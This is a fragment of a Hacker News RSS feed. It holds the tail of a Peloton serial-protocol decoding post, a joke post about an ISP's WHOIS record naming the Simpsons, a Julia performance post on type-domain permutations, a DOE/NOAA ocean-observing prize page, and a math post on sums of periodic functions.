<tr><td><tt>F5 44 39 F6</tt></td><td>10 bytes</td><td><tt>F1 44 05 30 30 30 30 30 2A F6</tt></td></tr>
<tr><td><tt>F5 4A 3F F6</tt></td><td>9 bytes</td><td><tt>F1 4A 04 38 36 36 30 13 F6</tt></td></tr>
</tbody></table>

<p>A few things are evident from simple inspection of the&nbsp;bytes:</p>
<ul>
<li>The first byte is a header - seems to be F5 from the <span>HU</span> and F1 from the&nbsp;bike.</li>
<li>All packets end in&nbsp;F6.</li>
<li>The second byte that the <span>HU</span> sends seems to be a request type, and is mirrored in the second byte in the bike’s&nbsp;response.</li>
<li>The third byte of the bike response is the length of the full packet minus 5 — probably indicates the length of the data payload following&nbsp;it.</li>
<li>Serial packets often carry a checksum, and here the second-to-last byte from either the <span>HU</span> or the bike seems to be that: it’s the sum (modulo 256) of all the bytes preceding&nbsp;it.</li>
</ul>
<p>Thus, the packet format seems to&nbsp;be:</p>
<ul>
<li><span>HU</span>: <code>F5 [request type] [checksum] F6</code></li>
<li>Bike: <code>F1 [request type] [payload length] [response bytes 1-n] [checksum] F6</code></li>
</ul>
<p>We can now throw together a quick plot of each response byte to look for&nbsp;patterns.</p>
<p><img alt="Bytewise plot of Peloton response data for common request packets during part of a ride" src="https://ihaque.org/static/img/2020/10/20201015-peloton-bytewise.png">
</p><center><strong>Bytewise plot of Peloton response data for common request packets during part of a ride</strong></center>
<p>It appears that every byte ranges from 0x30 to 0x39 — which is exactly the
<span>ASCII</span> range for decimal digits 0 through 9. Furthermore, the earlier bytes in
each packet appear to vary more quickly than the later ones through a ride,
suggesting that the least-significant digit comes first. <strong>The Peloton bike
is encoding its responses as little-endian <span>ASCII</span> digits.</strong> It’s easy enough
to dump a plot of these values per response type now that we know the&nbsp;encoding:</p>
<p><img alt="Decoded values sent by bike to head unit during a ride" src="https://ihaque.org/static/img/2020/10/20201015-peloton-ascii.png">
</p><center><strong>Decoded values sent by bike to head unit during a ride</strong></center>
<h2 id="decoding-cadence-rpm-power-and-almost-resistance"><a href="#decoding-cadence-rpm-power-and-almost-resistance">Decoding cadence (<span>RPM</span>), power, and (almost)&nbsp;resistance</a></h2>
<p>(To follow along, run <code>peloton_decoding/decode_resistance.py</code> from the
<a href="https://github.com/ihaque/pelomon">PeloMon Github repository</a>.)</p>
<p>Glancing at these graphs it’s pretty clear that we have ride data of the Peloton
trifecta — cadence, power, and resistance — with a couple weird things thrown in
for flavor. Comparing to the Peloton ride stats, <strong>request type 0x41 seems to directly
return cadence in rpm and request type 0x44 returns 10 times power in watts (i.e.,</strong></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ihaque.org/posts/2020/10/15/pelomon-part-i-decoding-peloton/">https://ihaque.org/posts/2020/10/15/pelomon-part-i-decoding-peloton/</a></em></p>]]>
            </description>
            <link>https://ihaque.org/posts/2020/10/15/pelomon-part-i-decoding-peloton/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24869207</guid>
            <pubDate>Fri, 23 Oct 2020 13:24:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[In Buenos Aires, Homer Simpson Runs Your ISP]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24868926">thread link</a>) | @todsacerdoti
<br/>
October 23, 2020 | https://blog.paranoidpenguin.net/2020/06/in-buenos-aires-homer-simpson-runs-your-isp/ | <a href="https://web.archive.org/web/*/https://blog.paranoidpenguin.net/2020/06/in-buenos-aires-homer-simpson-runs-your-isp/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Last month we had an issue with a multitude of unwanted connections against our mail servers from a specific netblock in Argentina. In my experience, coordinated attacks from IP addresses originating from the same netblock usually indicates an <a href="https://blog.paranoidpenguin.net/2018/08/hakaied-with-love-from-telecom-egypt/" title="Hakaied with love from Telecom Egypt">issue on the ISP side</a>.</p><p>The offending IP addresses all had port 80/tcp open, providing visitors with an airOS login screen. Like most software, old versions of airOS suffer from severe vulnerabilities, so unsurprisingly, keeping the firmware up to date is important.</p><h2 id="the-simpsons">The Simpsons</h2><p>I decided to perform a WHOIS search to identify the owner of the netblock and possibly raise my concerns. I’ll admit I choked hard on my coffee when I discovered that the organization in question was run by none other than Bart and Homer Simpson. Surprising, but yet somehow it all made sense.</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/06/homer-simpson-any-key.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/06/homer-simpson-any-key-663x393.png" alt="Homer Simpson can't find the any key"></a><figcaption><p>Homer Simpson deploying the latest firmware updates at Full Net HQ in Argentina.</p></figcaption></figure><pre><code>$ whois -h whois.lacnic.net AR-FESA21-LACNIC

% Copyright LACNIC lacnic.net
%  The data below is provided for information purposes
%  and to assist persons in obtaining information about or
%  related to AS and IP numbers registrations

owner:       ELDA SALERNO(FULLNET)
ownerid:     AR-FESA21-LACNIC
responsible: BART SIMPSON
address:     Falsa, 123, -
address:     - - Springfield - ?
country:     AR
phone:       +54  2912914075479 [0000]
owner-c:     GDF5
created:     20180802
changed:     20190105

nic-hdl:     GDF5
person:      Homer Simpson Fullnet
e-mail:      guillermo@FULL.NET.AR
address:     Falsa, 123, -
address:     8118 - Springfield - ?
country:     AR
phone:       +54  2914075479 [0000]
created:     20180612
changed:     20190105

aut-num:     267690
inetnum:     45.162.20/23
inetnum:     186.0.205/24
inetnum:     192.67.23/24
inetnum:     2803:81a0::/32

% whois.lacnic.net accepts only direct match queries.
% Types of queries are: POCs, ownerid, CIDR blocks, IP
% and AS numbers.
</code></pre><p>An excellent effort by the Internet Addresses Registry for Latin America and Caribbean (LACNIC) on approving membership applications. I don’t really have much else to say about this other than… <strong>D’oh!</strong></p><p><em>Image credit: The Simpsons, Season 7, Episode 7 - “King-Size Homer”.</em></p></div></div>]]>
            </description>
            <link>https://blog.paranoidpenguin.net/2020/06/in-buenos-aires-homer-simpson-runs-your-isp/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24868926</guid>
            <pubDate>Fri, 23 Oct 2020 12:53:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using type domain information in Julia]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24868897">thread link</a>) | @dklend122
<br/>
October 23, 2020 | https://ericphanson.com/blog/2019/another-example-of-using-type-domain-information-in-julia/ | <a href="https://web.archive.org/web/*/https://ericphanson.com/blog/2019/another-example-of-using-type-domain-information-in-julia/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In a <a href="https://ericphanson.com/blog/2018/fast-small-random-density-matrices/">previous post</a>, I discussed using type domain information to speed up generation of random density matrices with small dimension in Julia. There, we gave the Julia compiler knowledge of the dimension of the matrices at the time it generates code, instead of passing that dimension as a runtime variable, and saw significant runtime speedups as a consequence. This time, let’s push this further by giving the compiler a whole vector of numbers instead of a single integer.</p><p>Let’s say we are given a vector <code>v</code> of length <code>d</code> and wish to permute it according to some permutation <code>p</code>.</p><pre><code>julia&gt; d = 10
10

julia&gt; v = rand(10)
10-element Array{Float64,1}:
 0.4046199953615772  
 0.17907255467645533 
 0.061862135999016576
 0.3847457473964191  
 0.952322632505183   
 0.9526630116756152  
 0.74328422564288    
 0.17894074481236788 
 0.9869789349740046  
 0.575286289206322   

julia&gt; import Random

julia&gt; p = Random.randperm(d)
10-element Array{Int64,1}:
  7
 10
  3
  2
  5
  8
  9
  6
  1
  4</code></pre><p>Permuting <code>v</code> is easy since we can simply <a href="https://docs.julialang.org/en/v1/manual/arrays/index.html#man-supported-index-types-1">index by a vector</a>:</p><pre><code>julia&gt; v[p]
10-element Array{Float64,1}:
 0.74328422564288    
 0.575286289206322   
 0.061862135999016576
 0.17907255467645533 
 0.952322632505183   
 0.17894074481236788 
 0.9869789349740046  
 0.9526630116756152  
 0.4046199953615772  
 0.3847457473964191  
</code></pre><p>We can turn this into a function<span><label for="sn-1"></label><span>Actually, it already is a function, namely <code>getindex(v, p)</code>, for which <code>v[p]</code> is simply syntactic sugar. But let’s give it our own name here.</span></span>, which Julia will compile a method for based on the types of <code>v</code> and <code>p</code>.</p><pre><code>julia&gt; dynamic_permute(v, p) = v[p]
dynamic_permute (generic function with 1 method)

julia&gt; @time dynamic_permute(v, p)
  0.015476 seconds (5.10 k allocations: 221.314 KiB)
10-element Array{Float64,1}:
 0.74328422564288    
 0.575286289206322   
 0.061862135999016576
 0.17907255467645533 
 0.952322632505183   
 0.17894074481236788 
 0.9869789349740046  
 0.9526630116756152  
 0.4046199953615772  
 0.3847457473964191  </code></pre><p>The <code>@time</code> macro shows us the time it took to run that function the first time, which includes compilation time. If want to properly benchmark it, we should use <code>BenchmarkTools.jl</code><span><label for="sn-2"></label><span>Benchmark tools <code>@btime</code> macro avoids many difficulties with benchmarking code, providing a reliable comparison by e.g.&nbsp;running the code several times to avoid fluke timing results. We use the dollar signs to interpolate the (global) variables <code>v</code> and <code>p</code> into the call, so we aren’t timing the lookup of those variables. In Julia, non-constant global variables are slow, because their types could change at any time.</span></span>.</p><pre><code>julia&gt; using BenchmarkTools

julia&gt; @btime dynamic_permute($v, $p);
  79.195 ns (2 allocations: 176 bytes)</code></pre><p>But what if we want to permute many vectors with the same permutation? We can encode the permutation in the type domain and compile a specialized function to do this much faster. To make such a <a href="https://docs.julialang.org/en/v1/base/base/#Base.Val">value type</a>, our permutation must have <code>isbits(p) == true</code>.</p><pre><code>julia&gt; isbits(p)
false</code></pre><p>To remedy this, we could convert <code>p</code> to a tuple which has a static length, unlike a vector (which it currently is). However, then we won’t be able to do the indexing trick of <code>v[p]</code> to permute the entries of the vector. Instead, we’ll convert it to a <code>SVector</code> or static vector from <code>StaticArrays.jl</code>. This supports indexing like vectors, but is backed by a tuple of fixed length.</p><pre><code>julia&gt; using StaticArrays

julia&gt; p_static = SVector{d}(p)
10-element SArray{Tuple{10},Int64,1,10}:
  7
 10
  3
  2
  5
  8
  9
  6
  1
  4

julia&gt; isbits(p_static)
true</code></pre><p>We can then create a function <code>static_permute</code> which dispatches to a different method for every permutation. We do this by replacing the second argument with a parametric type <code>Val{p}</code>. We can then create a value type from our <code>isbits</code> vector <code>p_static</code> and act our new function on it.</p><pre><code>julia&gt; function static_permute(v, ::Val{p}) where {p}
           v[p]
       end
static_permute (generic function with 1 method)

julia&gt; p_val = Val(p_static)
Val{[7, 10, 3, 2, 5, 8, 9, 6, 1, 4]}()

julia&gt; @time static_permute(v, p_val)
  0.225438 seconds (287.31 k allocations: 14.911 MiB, 2.54% gc time)
10-element SArray{Tuple{10},Float64,1,10}:
 0.74328422564288    
 0.575286289206322   
 0.061862135999016576
 0.17907255467645533 
 0.952322632505183   
 0.17894074481236788 
 0.9869789349740046  
 0.9526630116756152  
 0.4046199953615772  
 0.3847457473964191 </code></pre><p>We can see it’s relatively slow to compile. However, let’s benchmark the runtime.</p><pre><code>julia&gt; @btime static_permute($v, $p_val);
  4.945 ns (0 allocations: 0 bytes)</code></pre><p>Less than 5 nanoseconds! Much faster now. We can see why this is by inspecting the typed code<span><label for="sn-3"></label><span>Julia’s introspection macros <code>@code_lowered</code>, <code>@code_typed</code>, <code>@code_llvm</code>, and <code>@code_native</code> show the code Julia is generating at various steps in the process of converting the code we type into machine code the processor executes.</span></span>:</p><pre><code>julia&gt; @code_typed static_permute(v, p_val)
CodeInfo(
1 ─       (Base.arraysize)(v, 1)::Int64
│   %2  = (Base.arrayref)(true, v, 7)::Float64
│   %3  = (Base.arrayref)(true, v, 10)::Float64
│   %4  = (Base.arrayref)(true, v, 3)::Float64
│   %5  = (Base.arrayref)(true, v, 2)::Float64
│   %6  = (Base.arrayref)(true, v, 5)::Float64
│   %7  = (Base.arrayref)(true, v, 8)::Float64
│   %8  = (Base.arrayref)(true, v, 9)::Float64
│   %9  = (Base.arrayref)(true, v, 6)::Float64
│   %10 = (Base.arrayref)(true, v, 1)::Float64
│   %11 = (Base.arrayref)(true, v, 4)::Float64
│   %12 = (StaticArrays.tuple)(%2, %3, %4, %5, %6, %7, %8, %9, %10, %11)::NTuple{10,Float64}
│   %13 = %new(SArray{Tuple{10},Float64,1,10}, %12)::SArray{Tuple{10},Float64,1,10}
└──       return %13
) =&gt; SArray{Tuple{10},Float64,1,10}</code></pre><p>This can be compared to the dynamic version:</p><pre><code>julia&gt; @code_typed dynamic_permute(v, p)
CodeInfo(
1 ──       (Base.arraysize)(v, 1)::Int64
└───       goto #18 if not true
2 ── %3  = (Core.tuple)(p)::Tuple{Array{Int64,1}}
│    %4  = (Base.arraysize)(v, 1)::Int64
│    %5  = (Base.slt_int)(%4, 0)::Bool
│    %6  = (Base.ifelse)(%5, 0, %4)::Int64
│    %7  = (Base.arraylen)(p)::Int64
│    %8  = (Base.sle_int)(0, %7)::Bool
│    %9  = (Base.bitcast)(UInt64, %7)::UInt64
│    %10 = (Base.ult_int)(0x0000000000000000, %9)::Bool
│    %11 = (Base.and_int)(%8, %10)::Bool
└───       goto #4 if not %11
3 ── %13 = (Base.arrayref)(false, p, 1)::Int64
└───       goto #5
4 ──       goto #5
5 ┄─ %16 = φ (#3 =&gt; false, #4 =&gt; true)::Bool
│    %17 = φ (#3 =&gt; %13)::Int64
│    %18 = φ (#3 =&gt; 2)::Int64
└───       goto #6
6 ── %20 = (Base.not_int)(%16)::Bool
└───       goto #12 if not %20
7 ┄─ %22 = φ (#6 =&gt; true, #11 =&gt; %28)::Bool
│    %23 = φ (#6 =&gt; %17, #11 =&gt; %41)::Int64
│    %24 = φ (#6 =&gt; %18, #11 =&gt; %42)::Int64
│    %25 = (Base.sle_int)(1, %23)::Bool
│    %26 = (Base.sle_int)(%23, %6)::Bool
│    %27 = (Base.and_int)(%25, %26)::Bool
│    %28 = (Base.and_int)(%22, %27)::Bool
│    %29 = (Base.bitcast)(UInt64, %24)::UInt64
│    %30 = (Base.sub_int)(%29, 0x0000000000000001)::UInt64
│    %31 = (Base.arraylen)(p)::Int64
│    %32 = (Base.sle_int)(0, %31)::Bool
│    %33 = (Base.bitcast)(UInt64, %31)::UInt64
│    %34 = (Base.ult_int)(%30, %33)::Bool
│    %35 = (Base.and_int)(%32, %34)::Bool
└───       goto #9 if not %35
8 ── %37 = (Base.arrayref)(false, p, %24)::Int64
│    %38 = (Base.add_int)(%24, 1)::Int64
└───       goto #10
9 ──       goto #10
10 ┄ %41 = φ (#8 =&gt; %37)::Int64
│    %42 = φ (#8 =&gt; %38)::Int64
│    %43 = φ (#8 =&gt; false, #9 =&gt; true)::Bool
│    %44 = (Base.not_int)(%43)::Bool
└───       goto #12 if not %44
11 ─       goto #7
12 ┄ %47 = φ (#10 =&gt; %28, #6 =&gt; true)::Bool
└───       goto #13
13 ─       goto #14
14 ─       goto #16 if not %47
15 ─       goto #17
16 ─       invoke Base.throw_boundserror(_2::Array{Float64,1}, %3::Tuple{Array{Int64,1}})::Union{}
└───       $(Expr(:unreachable))::Union{}
17 ┄       nothing::Nothing
18 ┄ %55 = invoke Base._unsafe_getindex($(QuoteNode(IndexLinear()))::IndexLinear, _2::Array{Float64,1}, _3::Array{Int64,1})::Array{Float64,1}
└───       goto #19
19 ─       goto #20
20 ─       return %55
) =&gt; Array{Float64,1}</code></pre><p>We can see in the static version, Julia just directly generates the code to index the vector appropriately according to the permutation. In the dynamic version, which uses the <strong>same</strong> code for any (<code>Float64</code>) vector of any length, and any permutation, the code is a fair bit longer and more complicated. In fact, all of the code shown above is simply to deal with things like throwing out of bounds errors in case the vector <code>v</code> does not have entries at the indicies <code>p</code> asks for. Then at the end, we see a call to <code>Base._unsafe_getindex</code> which actually does the indexing once all the error-checking is done.</p><p>So could this huge performance advantage in the static case be partly to the fact that we don’t need to check that the indexing operation is valid, since we know the lengths of both <code>v</code> and <code>p</code> at compile time in that case? We can check by benchmarking:</p><pre><code>julia&gt; @btime Base._unsafe_getindex($(IndexLinear()), $v, $p)
  58.133 ns (1 allocation: 160 bytes)
10-element Array{Float64,1}:
 0.74328422564288    
 0.575286289206322   
 0.061862135999016576
 0.17907255467645533 
 0.952322632505183   
 0.17894074481236788 
 0.9869789349740046  
 0.9526630116756152  
 0.4046199953615772  
 0.3847457473964191  </code></pre><p>58 nanoseconds still; so the bounds checking and all does take a bit of time, but the dynamic version is still 10x slower. We can make an even more fair comparison (without the worrisome <code>unsafe</code> operation even) by simply making the vector <code>v</code> a static vector as well:</p><pre><code>julia&gt; v_static = SVector{d}(v)
10-element SArray{Tuple{10},Float64,1,10}:
 0.4046199953615772  
 0.17907255467645533 
 0.061862135999016576
 0.3847457473964191  
 0.952322632505183   
 0.9526630116756152  
 0.74328422564288    
 0.17894074481236788 
 0.9869789349740046  
 0.575286289206322 </code></pre><p>Since <code>v_static</code> has a different type than <code>v</code>, we can call <code>dynamic_permute(v_static, p_static)</code> which will generate new code specifically for these static types. That is, when we call <code>dynamic_permute(v_static, p_static)</code>, the compiler will generate code to do the permutation knowing the length of …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ericphanson.com/blog/2019/another-example-of-using-type-domain-information-in-julia/">https://ericphanson.com/blog/2019/another-example-of-using-type-domain-information-in-julia/</a></em></p>]]>
            </description>
            <link>https://ericphanson.com/blog/2019/another-example-of-using-type-domain-information-in-julia/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24868897</guid>
            <pubDate>Fri, 23 Oct 2020 12:50:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Powering the Blue Economy: Ocean Observing Prize]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24868688">thread link</a>) | @T-A
<br/>
October 23, 2020 | https://americanmadechallenges.org/oceanobserving/ | <a href="https://web.archive.org/web/*/https://americanmadechallenges.org/oceanobserving/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="app">
      <water-navbar-component></water-navbar-component>
      <section>
        
        
        <div>
          <div>
            <div>
              <div>
                
                
                <p>
                  The Powering the Blue Economy™: Ocean Observing Prize challenges innovators to integrate marine renewable energy with ocean observation platforms, ultimately revolutionizing our ability to collect the data needed to understand, map, and monitor the ocean.
                </p>
              </div>
              <div>
                <p><img src="https://americanmadechallenges.org/oceanobserving/assets/img/american-made-water-prize-logo.png" alt="American-Made Water Prize Logo">
                </p>
              </div>
              <p>
                  This joint prize between the Water Power Technologies Office (WPTO) at the U.S. Department of Energy and the Integrated Ocean Observing System (IOOS®) Office at the National Oceanic and Atmospheric Administration (NOAA) seeks to develop new technologies that can help fill the data gaps making it difficult to realize the full potential of the Blue Economy. The Ocean Observing Prize includes a series of competitions with millions of dollars in awards to encourage rapid innovation in the fields of marine energy and ocean observations, that began with the DISCOVER Competition and is followed by the DEVELOP Competition. The Pacific Northwest National Laboratory and the National Renewable Energy Laboratory are supporting DOE and NOAA on the development and administration of the prize.
                </p>
              
              
              
              </div>
          </div>
        </div>
      </section>
      
      
      <section>
        <div>
          <div>
            <br>
            <div>
              <p>
                The Ocean Observing Prize is a series of competitions with cash awards to incentivize accelerated advancement of ideas from concept to demonstration. The first competition, the DISCOVER Competition, closed on February 12, 2020. Competitors submitted novel concepts that integrate ocean observing technologies with marine energy systems to address end-user needs across five broad themes: (1) Unmanned Vehicles; (2) Communications and Underwater Navigation; (3) Extreme Environments; (4) Buoys, Floats, and Tags; and (5) Blue Sea Ideas (i.e. other). Following the DISCOVER Competition, the DEVELOP Competition focuses on a single theme, <a href="https://americanmadechallenges.org/oceanobserving/develop.html">hurricane monitoring</a>, and challenges contestants to develop their ideas into a functioning prototype through three contests: DESIGN, BUILD, and SPLASH. Together, the DISCOVER and DEVELOP Competitions will award up to $3 million in cash prizes as well as other in-kind awards.
              </p>
              <p>
                The Ocean Observing Prize is repeatable, and it is expected that future iterations may focus on other themes. Through this competition, innovators will be able to tap into DOE and NOAA’s network of National Laboratories, energy incubators and accelerators, subject matter experts, and other resources across the nation to build novel technologies that collect critical ocean data.
              </p>
              <div>
                <p><span>
                    <img src="https://americanmadechallenges.org/oceanobserving/assets/img/AUV-timeline.jpg" data-src="assets/img/AUV-timeline.jpg" alt="Graphic of the Ocean Observing Develop Competition for hurricane monitoring using self-charging AUVs.  Design Contest - draft plans and models - 120 days, Build Contest - develop and tank test prototype - 180 days, Splash Contest - test prototypes at sea - 90+ days.">
                  </span>
                </p>
              </div>
              <p>
                The American-Made Challenges Prize platform, administered by the National Renewable Energy Laboratory, brings together America’s world-class research base with its unparalleled entrepreneurial support system—consisting of pioneering university teams, dozens of energy incubators, and 16 National Laboratories—to create a sweeping portfolio of innovations primed for private investment and commercial scale-up.
              </p>
              </div>
          </div>
        </div>
      </section>
      <section>
        <div>
          <br>
          <div>
            <h3>DEVELOP Competition</h3>
            <hr>
            <p>
              The first contest in the DEVELOP Competition, <a href="https://americanmadechallenges.org/oceanobserving/design.html">DESIGN</a>, is now open for applications.
            </p>
        </div>
      </div></section>
      <section>
        <div>
          <br>
          <div>
            <div>
              <h3>Important Dates</h3>
              <hr>
              <ul>
                <li>
                  <b>Submission Open:</b> October 19, 2020
                </li>
                <li>
                  <b>Submission Close:</b> February 16, 2021, at 5:00 p.m. EST
                </li>
                <li>
                  <b>Judging and Review Complete:</b> Anticipated March 17, 2021
                </li>
                <li>
                  <b>Winner Announcement and Awards:</b> Anticipated April 1, 2021
                </li>
              </ul>
              
              <p><b>
                All dates are subject to change including contest openings, deadlines, and announcements. Final dates for the opening of the DESIGN, BUILD, and SPLASH Contests will be posted here and on the HeroX site.
              </b></p><p>
                Sign up for updates on our <a href="https://www.herox.com/oceanobserving">HeroX challenge page</a>.
              </p>
            </div>
          </div>
        </div>
      </section>
      <section>
        <div>
          <br>
          <div>
            <div>
              <h3>Who can participate?</h3>
              <hr>
              <p>
                All are welcome and encouraged to join the American-Made Challenge Network and be a part of the ground-breaking change that will accelerate innovation in ocean observing and marine renewable energy technologies.
              </p>
              <br>
            </div>
          </div>
        </div>
      </section>
      <section>
        <div>
          <h3>Solutions that help shape the future</h3>
          <div>
            <div>
              <p><img src="https://americanmadechallenges.org/oceanobserving/assets/img/iStock-1204436869.jpg" data-src="assets/img/iStock-1204436869.jpg" alt="Underwater graphic of an autonomous underwater vehicle (UAV).">
              </p>
            </div>
            <div>
              <p>
                Are you a thinker, entrepreneur, facility or potential partner? Anyone with an innovative idea can help promote transformation by participating in the American-Made Challenges.
              </p>
              
              <p><a href="https://www.herox.com/oceanobserving" onclick="gtag('event', 'action', {'event_category': 'navigated to herox', 'event_label': 'linked to ocean observing'})">Ready for the Challenge?</a>
              <br>
            </p></div>
          </div>
          </div>
      </section>
      <!-- Full Images -->
      <div id="support-image-modal">
        
        <p><img src="https://americanmadechallenges.org/oceanobserving/assets/img/AUV-timeline.jpg" alt="Graphic of the Ocean Observing Develop Competition for hurricane monitoring using self-charging AUVs.  Design Contest - draft plans and models - 120 days, Build Contest - develop and tank test prototype - 180 days, Splash Contest - test prototypes at sea - 90+ days.">
        </p>
        </div>
      <!--youtube video modal-->
      <div id="video-container">
        <p>
          <iframe id="youtube" src="" data-src="https://youtube.com/embed/GOtqzP-pQV8?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen=""></iframe>
        </p>
        </div>
      <water-mobile-navbar-component></water-mobile-navbar-component>
      <water-footer-component></water-footer-component>
    </div></div>]]>
            </description>
            <link>https://americanmadechallenges.org/oceanobserving/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24868688</guid>
            <pubDate>Fri, 23 Oct 2020 12:22:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[From Vector Spaces to Periodic Functions]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24868378">thread link</a>) | @susam
<br/>
October 23, 2020 | https://susam.in/blog/from-vector-spaces-to-periodic-functions/ | <a href="https://web.archive.org/web/*/https://susam.in/blog/from-vector-spaces-to-periodic-functions/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>By <b>Susam Pal</b> on 30 Jan 2019</p>
<h2 id="vector-spaces"><a href="#vector-spaces">Vector Spaces</a></h2>
<p>
A fascinating result that appears in linear algebra is the fact that the
set of real numbers \( \mathbb{R} \) is a vector space over the set of
rational numbers \( \mathbb{Q}. \) This may appear surprising at first
but it is easy to show that it is indeed so by checking that all eight
axioms of vector spaces hold good:
</p>

<ol>
  <li>
    <p>
      Commutativity of vector addition:<br>
      \( x + y = y + x \) for all \( x, y \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Associativity of vector addition:<br>
      \( x + (y + z) = (x + y) + z \) for all \( x, y, z \in \mathbb{R}.
      \)
    </p>
  </li>
  <li>
    <p>
      Existence of additive identity vector:<br>
      We have \( 0 \in \mathbb{R} \) such that \( x + 0 = x \) for all
      \( x \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Existence of additive inverse vectors:<br>
      There exists \( -x \in \mathbb{R} \) for all \( x \in \mathbb{R}.
      \)
    </p>
  </li>
  <li>
    <p>
      Associativity of scalar multiplication:<br>
      \( a(bx) = (ab)x \) for all \( a, b \in \mathbb{Q} \) and all \( x
      \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Distributivity of scalar multiplication over vector addition:<br>
      \( a(x + y) = ax + by \) for all \( a \in \mathbb{Q} \) and all \(
      x, y \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Distributivity of scalar multiplication over scalar addition:<br>
      \( (a + b)x = ax + bx \) for all \( a, b \in \mathbb{Q} \) and all
      \( x \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Existence of scalar multiplicative identity:<br>
      We have \( 1 \in \mathbb{Q} \) such that \( 1 \cdot x = x \) for
      all \( x \in \mathbb{R}. \)
    </p>
  </li>
</ol>
<p>
  This shows that the set of real numbers \( \mathbb{R} \) forms a
  vector space over the field of rational numbers \( \mathbb{Q}. \)
  Another quick way to arrive at this fact is to observe that \(
  \mathbb{Q} \subseteq \mathbb{R}, \) that is, \( \mathbb{Q} \) is a
  subfield of \( \mathbb{R}. \) Any field is a vector space over any of
  its subfields, so \( \mathbb{R} \) must be a vector space over \(
  \mathbb{Q}. \)
</p>


<h2 id="problem"><a href="#problem">Problem</a></h2>

<p>
Here is an interesting problem related to vector spaces that I came
across recently:
</p>

<div>
<p>
Define two periodic functions \( f \) and \( g \) from \( \mathbb{R} \)
to \( \mathbb{R} \) such that their sum \( f + g \) is the identity
function. The axiom of choice is allowed.
</p>
<p>
A function \( f \) is periodic if there exists \( p \gt 0 \) such that
\( f(x + p) = f(x) \) for all \( x \) in the domain.
</p>
</div>

<p>
<em>
If you want to think about this problem, this is a good time to pause
and think about it. There are spoilers ahead.
</em>
</p>


<h2 id="solution"><a href="#solution">Solution</a></h2>

<p>
The axiom of choice is equivalent to the statement that every vector
space has a basis. Since the set of real numbers \( \mathbb{R} \) is a
vector space over the set of rational numbers \( \mathbb{Q}, \) there
must be a basis \( \mathcal{H} \subseteq \mathbb{R} \) such that every
real number \( x \) can be written uniquely as a finite linear
combination of elements of \( \mathcal{H} \) with rational coefficients,
that is,
\[
  x = \sum_{a \in \mathcal{H}} x_a a
\]
where each \( x_a \in \mathbb{Q} \) and \( \{ a \in \mathcal{H} \mid x_a
\ne 0 \} \) is finite. The set \( \mathcal{H} \) is also known as the
Hamel basis.
</p>

<p>
In the above expansion of \( x, \) we use the notation \( x_a \) to
denote the rational number that appears as the coefficient of the basis
vector \( a. \) Therefore \( (x + y)_{a} = x_a + y_a \) for all \( x, y
\in \mathbb{R} \) and all \( a \in \mathcal{H}. \)
</p>

<p>
We know that \( b_a = 0 \) for distinct \( a, b \in \mathcal{H} \)
because \( a \) and \( b \) are basis vectors. Thus \( (x + b)_{a} = x_a
+ b_a = x_a + 0 = x_a \) for all \( x \in \mathbb{R} \) and distinct \(
a, b \in \mathcal{H}. \) This shows that a function \( f(x) = x_a \) is
a periodic function with period \( b \) for any \( a \in \mathcal{H} \)
and any \( b \in \mathcal{H} \setminus \{ a \}. \)
</p>

<p>
Let us define two functions:
\begin{align*}
  g(x) &amp; = \sum_{a \in \mathcal{H} \setminus \{ b \}} x_a a,
  &amp;
  h(x) &amp; = x_b b.
\end{align*}
where \( b \in \mathcal{H} \) and \( x \in \mathbb{R}. \) Now \( g(x) \)
is a periodic function with period \( b \) for any \( b \in \mathcal{H}
\) and \( h(x) \) is a periodic function with period \( c \) for any \(
c \in \mathcal{H} \setminus \{ b \}. \) Further,
\[
  g(x) + h(x)
  = \left( \sum_{a \in \mathcal{H} \setminus \{ b \}} x_a a \right) + x_b b
  = \sum_{a \in \mathcal{H}} x_a a
  = x.
\]
Thus \( g(x) \) and \( h(x) \) are two periodic functions such that
their sum is the identity function.
</p>


<h2 id="references"><a href="#references">References</a></h2>
<ul>
  <li>
    <a href="https://mathworld.wolfram.com/VectorSpace.html">Vector
    Space</a> by Eric W. Weisstein
  </li>
  <li>
    <a href="https://web.archive.org/web/20141026224511/https://drexel28.wordpress.com/2010/10/22/the-dimension-of-r-over-q/">The
    Dimension of R over Q</a> by Alex Youcis
  </li>
  <li>
    <a href="https://mathblag.wordpress.com/2013/09/01/sums-of-periodic-functions/">Sums
  of Periodic Functions</a> by David Radcliffe
  </li>
</ul>




</div></div>]]>
            </description>
            <link>https://susam.in/blog/from-vector-spaces-to-periodic-functions/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24868378</guid>
            <pubDate>Fri, 23 Oct 2020 11:37:01 GMT</pubDate>
        </item>
        <item>
            <title>
